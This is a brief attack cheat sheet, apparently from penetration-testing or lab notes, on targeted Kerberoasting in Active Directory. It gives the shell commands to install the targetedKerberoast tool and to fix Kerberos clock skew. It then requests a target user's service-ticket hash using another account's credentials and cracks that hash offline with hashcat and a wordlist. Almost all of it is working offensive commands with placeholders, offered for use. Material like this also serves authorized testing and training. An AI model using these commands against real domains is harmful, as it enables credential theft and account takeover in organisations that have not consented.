#### Installing targeted Kerberoast
```shell
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
python3 -m pip install -r requirements.txt
python3 targetedKerberoast.py --help
```

**Error Found**: Kerberos `SessionError`: **KRB_AP_ERR_SKEW**(Clock skew too great)
**Fixing ->**
```shell
sudo apt install rdate
sudo timedatectl set-ntp off
sudo rdate -n <Domain-IP>
```

#### Use the `UserX` account to attack the `Target-User` account and try to retrieve its hash

```shell
python3 targetedKerberoast.py -vv -d Domain.com -u <UserX> -p <password> --request-user <TARGET_USER> --dc-ip <Domain-IP>
```
#### Cracking the `Kerberoastable` Hash
```shell
hashcat -m 13100 /tmp/hash /usr/share/wordlists/rockyou.txt --force
```
